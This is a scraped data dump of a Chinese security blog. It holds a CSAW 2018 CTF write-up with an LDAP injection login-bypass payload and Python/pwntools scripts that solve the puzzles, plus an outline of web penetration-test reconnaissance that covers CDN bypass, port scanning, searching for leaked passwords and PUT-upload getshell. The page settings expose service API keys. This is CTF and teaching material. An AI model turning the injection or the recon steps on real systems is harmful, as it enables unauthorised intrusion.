class=\"hljs-keyword\">global</span> flag\n    n = len(t)\n    <span class=\"hljs-keyword\">for</span> k <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">1366</span>):\n        <span class=\"hljs-comment\">#5个L</span>\n        <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(n):\n            <span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(n):\n                <span class=\"hljs-keyword\">if</span> (t[i][j] == k):\n                    x = <span class=\"hljs-string\">\"(%d,%d)\"</span> % (i,j)\n                    flag += x\n                    <span class=\"hljs-comment\">#print \"%3s\" % x,</span>\n        flag = re.sub(<span class=\"hljs-string\">'\\\\)\\\\('</span>,<span class=\"hljs-string\">'),('</span>,flag)\n        \n        <span class=\"hljs-keyword\">if</span> (flag != <span class=\"hljs-string\">''</span>):\n            nc.sendline(flag)\n            <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"%s ---  ok\"</span> % flag\n        flag = <span class=\"hljs-string\">''</span>\n        \n            \nchess(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, xxxx, yyyy, size1)\n<span class=\"hljs-comment\">#show(table)</span>\nshowpoint(table)\n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"-----------------------ok-------------------------\"</span>\ntxt = nc.recvline()\n<span class=\"hljs-keyword\">print</span> txt\nnc.interactive()</code></pre></p>\n<p>####战队其他大佬的write<br><strong><a href=\"https://zoepla.github.io/2018/09/csaw2018_pwn_wp/\" target=\"_blank\" rel=\"noopener\">CSAW 2018 pwn wp</a></strong><br><strong><a href=\"https://delcoding.github.io/2018/09/csaw-writeup/\" target=\"_blank\" rel=\"noopener\">CSAW 2018 writeup</a></strong><br><strong><a href=\"https://delcoding.github.io/2018/09/csaw-writeup2/\" target=\"_blank\" rel=\"noopener\">CSAW 2018 复现writeup</a></strong></p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p><del>web题目好难啊</del>，太菜了，真的是太菜了</p>","more":"<h5 id=\"Ldab\"><a href=\"#Ldab\" class=\"headerlink\" title=\"Ldab\"></a>Ldab</h5><p>&emsp;&emsp;瞎测了一下发现不是sql注入，百度查了一下<code>Ldab</code>得到一个<code>Ldap注入</code>，Ldap是轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。简单来说就是类似数据库的一个东东。详细介绍点这里–&gt;<a href=\"https://www.jianshu.com/p/d94673be9ed0\" target=\"_blank\" rel=\"noopener\">传送门</a><br>第一次接触找不到注入姿势，下面给出大佬的payload<br><pre><code class=\"hljs undefined\">*)<span class=\"hljs-params\">(<span class=\"hljs-attr\">uid</span>=*)</span>)<span class=\"hljs-params\">(|(<span class=\"hljs-attr\">uid</span>=*</span></code></pre></p>\n<p><img src=\"/img/2018-09-17/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"></p>\n<h4 id=\"Algebra\"><a href=\"#Algebra\" class=\"headerlink\" title=\"Algebra\"></a>Algebra</h4><p>数学计算，下面放出大佬的payload<br><pre><code class=\"hljs python\"><span class=\"hljs-comment\"># -*- coding:utf-8 -*-</span>\n\n<span class=\"hljs-keyword\">import</span> socket\n\nsc = socket.socket()  <span class=\"hljs-comment\"># 创建 socket 对象</span>\nhost = <span class=\"hljs-string\">\"misc.chal.csaw.io\"</span>  <span class=\"hljs-comment\"># 获取本地主机名</span>\nport = <span class=\"hljs-number\">9002</span>  <span class=\"hljs-comment\"># 设置端口</span>\naddr = (host, port)\nsc.connect(addr)  <span class=\"hljs-comment\"># 绑定端口号</span>\n<span class=\"hljs-keyword\">print</span> sc.recv(<span class=\"hljs-number\">1024</span>)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">solve1</span><span class=\"hljs-params\">(eq,var=<span class=\"hljs-string\">'X'</span>)</span>:</span>\n    eq1 = eq.replace(<span class=\"hljs-string\">\"=\"</span>,<span class=\"hljs-string\">\"-(\"</span>) + <span class=\"hljs-string\">\")\"</span>\n    c = eval(eq1,&#123;var:<span class=\"hljs-number\">1j</span>&#125;)\n    <span class=\"hljs-keyword\">if</span> (-c.real == <span class=\"hljs-number\">0</span>):\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>\n    <span class=\"hljs-keyword\">else</span>:\n        <span class=\"hljs-keyword\">return</span> -c.real/c.imag\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">find</span><span class=\"hljs-params\">()</span>:</span>\n    data = sc.recv(<span class=\"hljs-number\">1024</span>)\n    <span class=\"hljs-keyword\">print</span> data\n    equation = data.split(<span class=\"hljs-string\">'\\n'</span>)[<span class=\"hljs-number\">0</span>]\n    result = str(solve1(equation))\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'正在求解：'</span> + equation + <span class=\"hljs-string\">', result = '</span> + result\n    sc.send(result + <span class=\"hljs-string\">'\\n'</span>)\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'==========================='</span>\n\nfind()\n\ni = <span class=\"hljs-number\">1</span>\n<span class=\"hljs-keyword\">while</span> <span class=\"hljs-keyword\">True</span>:\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'============ 第 '</span> + str(i + <span class=\"hljs-number\">1</span>) + <span class=\"hljs-string\">' 轮 ==============='</span>\n    data = sc.recv(<span class=\"hljs-number\">2048</span>)\n    <span class=\"hljs-keyword\">print</span> data\n    equation = data.split(<span class=\"hljs-string\">'\\n'</span>)[<span class=\"hljs-number\">1</span>]\n    result = str(solve1(equation))\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'正在求解：'</span> + equation + <span class=\"hljs-string\">', result = '</span> + result\n    sc.send(result + <span class=\"hljs-string\">'\\n'</span>)\n    i += <span class=\"hljs-number\">1</span></code></pre></p>\n<h5 id=\"Take-an-L\"><a href=\"#Take-an-L\" class=\"headerlink\" title=\"Take an L\"></a>Take an L</h5><p>题目意思是，给你一个64x64的棋盘，随机给一个特殊格子，像下面<br><img src=\"/img/2018-09-17/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>然后用四种L型的瓷砖覆盖<br><img src=\"/img/2018-09-17/3.gif\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>然后把每个L型瓷砖的坐标发过去<br>百度上找到的一个分治策略的做法–&gt;<a href=\"https://www.jianshu.com/p/97b09ef06735\" target=\"_blank\" rel=\"noopener\">传送门</a><br><img src=\"/img/2018-09-17/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br><pre><code class=\"hljs python\"><span class=\"hljs-comment\"># coding:utf-8</span>\n<span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-keyword\">import</span> re\n<span class=\"hljs-comment\">#context.log_level =\"debug\"</span>\nnc = remote(<span class=\"hljs-string\">\"misc.chal.csaw.io\"</span>,<span class=\"hljs-number\">9000</span>)\nnc.recvlines(<span class=\"hljs-number\">4</span>)\ndimension = nc.recvline()\n<span class=\"hljs-keyword\">print</span> dimension\ntxt = nc.recvline()\n<span class=\"hljs-keyword\">print</span> txt\nlocaltion2 = re.search(<span class=\"hljs-string\">':'</span>,txt).span()\nblock = txt[localtion2[<span class=\"hljs-number\">1</span>]+<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">-1</span>]\nli = re.findall(<span class=\"hljs-string\">r'\\d+'</span>,block)\nxxxx = int(li[<span class=\"hljs-number\">0</span>])\nyyyy = int(li[<span class=\"hljs-number\">1</span>])\n\n<span class=\"hljs-comment\"># 定义数组宽度为2的几次方</span>\nk = <span class=\"hljs-number\">6</span>\n<span class=\"hljs-comment\"># 棋盘宽度</span>\nsize1 = pow(<span class=\"hljs-number\">2</span>, k)\n<span class=\"hljs-comment\"># L形块的初始值</span>\nmark = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-comment\"># table初始化</span>\ntable = [[<span class=\"hljs-number\">-1</span> <span class=\"hljs-keyword\">for</span> x <span class=\"hljs-keyword\">in</span> range(size1)] <span class=\"hljs-keyword\">for</span> y <span class=\"hljs-keyword\">in</span> range(size1)]\n \nflag = <span class=\"hljs-string\">\"\"</span> \n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">chess</span><span class=\"hljs-params\">(tr, tc, pr, pc, size)</span>:</span>\n    <span class=\"hljs-keyword\">global</span> mark\n    <span class=\"hljs-keyword\">global</span> table\n    <span class=\"hljs-keyword\">if</span> size == <span class=\"hljs-number\">1</span>:\n        <span class=\"hljs-keyword\">return</span>\n    mark += <span class=\"hljs-number\">1</span>\n    count = mark\n    half = size // <span class=\"hljs-number\">2</span>\n    <span class=\"hljs-keyword\">if</span> pr &lt; tr + half <span class=\"hljs-keyword\">and</span> pc &lt; tc + half:\n        chess(tr, tc, pr, pc, half)\n    <span class=\"hljs-keyword\">else</span>:\n        table[tr + half - <span class=\"hljs-number\">1</span>][tc + half - <span class=\"hljs-number\">1</span>] = count\n        chess(tr, tc, tr + half - <span class=\"hljs-number\">1</span>, tc + half - <span class=\"hljs-number\">1</span>, half)\n    <span class=\"hljs-keyword\">if</span> pr &lt; tr + half <span class=\"hljs-keyword\">and</span> pc &gt;= tc + half:\n        chess(tr, tc + half, pr, pc, half)\n    <span class=\"hljs-keyword\">else</span>:\n        table[tr + half - <span class=\"hljs-number\">1</span>][tc + half] = count\n        chess(tr, tc + half, tr + half - <span class=\"hljs-number\">1</span>, tc + half, half)\n    <span class=\"hljs-keyword\">if</span> pr &gt;= tr + half <span class=\"hljs-keyword\">and</span> pc &lt; tc + half:\n        chess(tr + half, tc, pr, pc, half)\n    <span class=\"hljs-keyword\">else</span>:\n        table[tr + half][tc + half - <span class=\"hljs-number\">1</span>] = count\n        chess(tr + half, tc, tr + half, tc + half - <span class=\"hljs-number\">1</span>, half)\n    <span class=\"hljs-keyword\">if</span> pr &gt;= tr + half <span class=\"hljs-keyword\">and</span> pc &gt;= tc + half:\n        chess(tr + half, tc + half, pr, pc, half)\n    <span class=\"hljs-keyword\">else</span>:\n        table[tr + half][tc + half] = count\n        chess(tr + half, tc + half, tr + half, tc + half, half)\n \n \n<span class=\"hljs-comment\"># 棋盘展示</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">show</span><span class=\"hljs-params\">(t)</span>:</span>\n    n = len(t)\n    <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(n):\n        <span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(n):\n            <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"%4d\"</span> % t[i][j],\n        <span class=\"hljs-keyword\">print</span>\n \n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">showpoint</span><span class=\"hljs-params\">(t)</span>:</span>\n    <span class=\"hljs-keyword\">global</span> flag\n    n = len(t)\n    <span class=\"hljs-keyword\">for</span> k <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">1366</span>):\n        <span class=\"hljs-comment\">#5个L</span>\n        <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(n):\n            <span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(n):\n                <span class=\"hljs-keyword\">if</span> (t[i][j] == k):\n                    x = <span class=\"hljs-string\">\"(%d,%d)\"</span> % (i,j)\n                    flag += x\n                    <span class=\"hljs-comment\">#print \"%3s\" % x,</span>\n        flag = re.sub(<span class=\"hljs-string\">'\\\\)\\\\('</span>,<span class=\"hljs-string\">'),('</span>,flag)\n        \n        <span class=\"hljs-keyword\">if</span> (flag != <span class=\"hljs-string\">''</span>):\n            nc.sendline(flag)\n            <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"%s ---  ok\"</span> % flag\n        flag = <span class=\"hljs-string\">''</span>\n        \n            \nchess(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, xxxx, yyyy, size1)\n<span class=\"hljs-comment\">#show(table)</span>\nshowpoint(table)\n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"-----------------------ok-------------------------\"</span>\ntxt = nc.recvline()\n<span class=\"hljs-keyword\">print</span> txt\nnc.interactive()</code></pre></p>\n<p>####战队其他大佬的write<br><strong><a href=\"https://zoepla.github.io/2018/09/csaw2018_pwn_wp/\" target=\"_blank\" rel=\"noopener\">CSAW 2018 pwn wp</a></strong><br><strong><a href=\"https://delcoding.github.io/2018/09/csaw-writeup/\" target=\"_blank\" rel=\"noopener\">CSAW 2018 writeup</a></strong><br><strong><a href=\"https://delcoding.github.io/2018/09/csaw-writeup2/\" target=\"_blank\" rel=\"noopener\">CSAW 2018 复现writeup</a></strong></p>"},{"title":"Web渗透测试中一些信息收集的方法和思路","index_img":"/img/2019-01-17/index.jpg","date":"2019-01-17T12:02:20.000Z","_content":"**对敌人不了解，怎么打败敌人**\n<!--more-->\n\n### 一、 信息收集：\n#### 1.1 真实IP地址\n&emsp;&emsp;**如果IP地址不是真实的，测试会出现偏差(如：测试的端口服务全部都是假的)**\n&emsp;&emsp;1.1.1 ping命令\n&emsp;&emsp;1.1.2 IP138在线查询\n&emsp;&emsp;1.1.3 CDN地址探测（隐藏真实IP地址）\n&emsp;&emsp;&emsp;&emsp;如：xxx.cdn.XXX....IP地址（这个是CDN地址不是真实IP）\n&emsp;&emsp;&emsp;&emsp;绕过CDN小窍门：XSS漏洞、DDOS、邮件订阅...等\n#### 1.2 端口服务探测\n&emsp;&emsp;**用于暴力破解、系统架构判断**\n&emsp;&emsp;1个域名可以解析多个IP地址的端口\n&emsp;&emsp;1.2.1 Nmap探测\n&emsp;&emsp;1.2.2 Zenmap探测\n#### 1.3 HTML前端敏感注释信息\n&emsp;&emsp;1.3.1 <\\!--看注释信息,**因为有的管理员会把测试账户密码写进去**-->\n&emsp;&emsp;1.3.2 前端框架信息，如：Jquery框架\n&emsp;&emsp;1.3.3 框架查看攻略\n&emsp;&emsp;&emsp;&emsp;1.3.3.1 路径地址（扔百度里）\n&emsp;&emsp;&emsp;&emsp;1.3.3.2 JS里面版权信息\n&emsp;&emsp;1.3.4 框架信息扔百度里搜索公开漏洞\n&emsp;&emsp;&emsp;&emsp;1.3.4.1 DOM XSS跨站脚本攻击漏洞\n&emsp;&emsp;&emsp;&emsp;1.3.4.2 ....（其他未知漏洞）\n#### 1.4 whois信息收集\n&emsp;&emsp;1.4.1 在线收集，如：DNS地址/注册邮箱/时间...等\n&emsp;&emsp;&emsp;&emsp;1.4.1.1 拿到邮箱地址可以百度查询公开的密码等信息\n&emsp;&emsp;1.4.2 Kali-whois查询\n#### 1.5 中间件版本信息\n&emsp;&emsp;1.5.1 系统报错的方式\n&emsp;&emsp;1.5.2 抓包的方式（如：请求：OPTIONS）\n&emsp;&emsp;&emsp;&emsp;1.5.2.1 如果OPTIONS以后开启了PUT方法，可以尝试上传漏洞GETSHELL\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;IIS6.0、Apache存在这个漏洞可能性较大\n&emsp;&emsp;1.5.3 漏洞扫描器自带判断功能\n&emsp;&emsp;1.5.4 端口服务探测方式自动探测\n#### 1.6 系统功能信息\n&emsp;&emsp;**只要能交互的，全部都收集（包括功能地址）**\n&emsp;&emsp;1.6.1 增删改查功能\n&emsp;&emsp;1.6.2 文件上传功能\n&emsp;&emsp;1.6.3 功能请求方式和参数\n#### 1.7 系统服务端编程语言\n&emsp;&emsp;1.7.1 编程语言（JavaWeb、PHP...等）\n&emsp;&emsp;&emsp;&emsp;  JSP（特征：HTML前端开头以及部分代码模块后面大量的换行）\n&emsp;&emsp;1.7.2 编程框架（如：S2、THinkPHP...等以及相关目录和URL后缀）\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;如：.action、.do\n#### 1.8 域名/子域名\n&emsp;&emsp;**二级、三级、四级、五级...,通过域名来判断该系统的数量规模**\n&emsp;&emsp;1.8.1 子域名挖掘机\n&emsp;&emsp;1.8.2 其他工具（....）\n#### 1.9 目录/子目录\n&emsp;&emsp;**二级、三级、四级、五级...**\n&emsp;&emsp;1.9.1 御剑目录扫描器\n&emsp;&emsp;1.9.2 Kali-Dirb目录探测\n&emsp;&emsp;1.9.3 Kali-Dirbuster（/usr/share/dirbuster下）\n&emsp;&emsp;1.9.4 BurpSuite爬虫\n#### 1.10 C段/旁注\n&emsp;&emsp;1.10.1 旁站在线查询\n&emsp;&emsp;1.10.2 C段在线查询\n#### 1.11 DNS地址信息收集\n&emsp;&emsp;SOA 权威记录\n&emsp;&emsp;NS 服务器记录\n&emsp;&emsp;A IPv4地址记录\n&emsp;&emsp;MX 邮件交换记录\n&emsp;&emsp;PTR IP地址反解析\n&emsp;&emsp;AAAA IPv6地址记录\n&emsp;&emsp;CNAME 别名记录\n&emsp;&emsp;1.11.1 Kali-Dig\n&emsp;&emsp;1.11.2 Kali-dnsenum\n#### 1.12 综合信息收集\n&emsp;&emsp;1.12.1 Kali-theharvester(比如：-d baidu.com -l 100 -b bing)\n#### 1.13 资产信息收集\n&emsp;&emsp;1.13.1 钟馗之眼（在线）\n&emsp;&emsp;1.13.2 佛法查询（在线）\n#### 1.14 搜索引擎黑客\n&emsp;&emsp;1.14.1 百度黑客搜索语法\n&emsp;&emsp;1.14.2 谷歌黑客搜索语法\n#### 1.15 邮箱信息\n&emsp;&emsp;1.15.1 公开的邮箱地址\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;如：@XX.com\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;你可以看到命名规则，还能收集更多的信息\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;留着邮箱地址后期可以暴力破解\n&emsp;&emsp;1.15.2 邮箱地址泄露的密码\n&emsp;&emsp;1.15.3 邮箱地址泄露的其他信息\n#### 1.16 系统公开漏洞\n&emsp;&emsp;1.16.1 乌云镜像\n&emsp;&emsp;1.16.2 老漏洞复现\n&emsp;&emsp;1.16.3 老漏洞暴露的其他信息\n#### 1.17 WAF防火墙探测\n&emsp;&emsp;1.17.1 报错方式\n&emsp;&emsp;1.17.2 漏洞探测（如：敏感字符：% -- \" ' @ //等）\n&emsp;&emsp;1.17.3 公开漏洞\n&emsp;&emsp;1.17.4 扫描探测（如：Nmap）\n#### 1.18 其他信息收集\n&emsp;&emsp;1.18.1 火狐插件-Wappalyzer\n&emsp;&emsp;1.18.2 其他插件....\n&emsp;&emsp;1.18.3 APP手机软件破解或抓包\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;破解以后里面有注释信息和其他信息\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;抓包可以看到通讯IP地址，进行二次，三次信息收集和渗透\n\n\n","source":"_posts/2019-01-17-information-collection.md","raw":"---\ntitle: Web渗透测试中一些信息收集的方法和思路\nindex_img: /img/2019-01-17/index.jpg\ndate: 2019-01-17 20:02:20\ntags: \n- 信息收集\n- Web\n- 渗透测试\n---\n**对敌人不了解，怎么打败敌人**\n<!--more-->\n\n### 一、 信息收集：\n#### 1.1 真实IP地址\n&emsp;&emsp;**如果IP地址不是真实的，测试会出现偏差(如：测试的端口服务全部都是假的)**\n&emsp;&emsp;1.1.1 ping命令\n&emsp;&emsp;1.1.2 IP138在线查询\n&emsp;&emsp;1.1.3 CDN地址探测（隐藏真实IP地址）\n&emsp;&emsp;&emsp;&emsp;如：xxx.cdn.XXX....IP地址（这个是CDN地址不是真实IP）\n&emsp;&emsp;&emsp;&emsp;绕过CDN小窍门：XSS漏洞、DDOS、邮件订阅...等\n#### 1.2 端口服务探测\n&emsp;&emsp;**用于暴力破解、系统架构判断**\n&emsp;&emsp;1个域名可以解析多个IP地址的端口\n&emsp;&emsp;1.2.1 Nmap探测\n&emsp;&emsp;1.2.2 Zenmap探测\n#### 1.3 HTML前端敏感注释信息\n&emsp;&emsp;1.3.1 <\\!--看注释信息,**因为有的管理员会把测试账户密码写进去**-->\n&emsp;&emsp;1.3.2 前端框架信息，如：Jquery框架\n&emsp;&emsp;1.3.3 框架查看攻略\n&emsp;&emsp;&emsp;&emsp;1.3.3.1 路径地址（扔百度里）\n&emsp;&emsp;&emsp;&emsp;1.3.3.2 JS里面版权信息\n&emsp;&emsp;1.3.4 框架信息扔百度里搜索公开漏洞\n&emsp;&emsp;&emsp;&emsp;1.3.4.1 DOM XSS跨站脚本攻击漏洞\n&emsp;&emsp;&emsp;&emsp;1.3.4.2 ....（其他未知漏洞）\n#### 1.4 whois信息收集\n&emsp;&emsp;1.4.1 在线收集，如：DNS地址/注册邮箱/时间...等\n&emsp;&emsp;&emsp;&emsp;1.4.1.1 拿到邮箱地址可以百度查询公开的密码等信息\n&emsp;&emsp;1.4.2 Kali-whois查询\n#### 1.5 中间件版本信息\n&emsp;&emsp;1.5.1 系统报错的方式\n&emsp;&emsp;1.5.2 抓包的方式（如：请求：OPTIONS）\n&emsp;&emsp;&emsp;&emsp;1.5.2.1 如果OPTIONS以后开启了PUT方法，可以尝试上传漏洞GETSHELL\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;IIS6.0、Apache存在这个漏洞可能性较大\n&emsp;&emsp;1.5.3 漏洞扫描器自带判断功能\n&emsp;&emsp;1.5.4 端口服务探测方式自动探测\n#### 1.6 系统功能信息\n&emsp;&emsp;**只要能交互的，全部都收集（包括功能地址）**\n&emsp;&emsp;1.6.1 增删改查功能\n&emsp;&emsp;1.6.2 文件上传功能\n&emsp;&emsp;1.6.3 功能请求方式和参数\n#### 1.7 系统服务端编程语言\n&emsp;&emsp;1.7.1 编程语言（JavaWeb、PHP...等）\n&emsp;&emsp;&emsp;&emsp;  JSP（特征：HTML前端开头以及部分代码模块后面大量的换行）\n&emsp;&emsp;1.7.2 编程框架（如：S2、THinkPHP...等以及相关目录和URL后缀）\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;如：.action、.do\n#### 1.8 域名/子域名\n&emsp;&emsp;**二级、三级、四级、五级...,通过域名来判断该系统的数量规模**\n&emsp;&emsp;1.8.1 子域名挖掘机\n&emsp;&emsp;1.8.2 其他工具（....）\n#### 1.9 目录/子目录\n&emsp;&emsp;**二级、三级、四级、五级...**\n&emsp;&emsp;1.9.1 御剑目录扫描器\n&emsp;&emsp;1.9.2 Kali-Dirb目录探测\n&emsp;&emsp;1.9.3 Kali-Dirbuster（/usr/share/dirbuster下）\n&emsp;&emsp;1.9.4 BurpSuite爬虫\n#### 1.10 C段/旁注\n&emsp;&emsp;1.10.1 旁站在线查询\n&emsp;&emsp;1.10.2 C段在线查询\n#### 1.11 DNS地址信息收集\n&emsp;&emsp;SOA 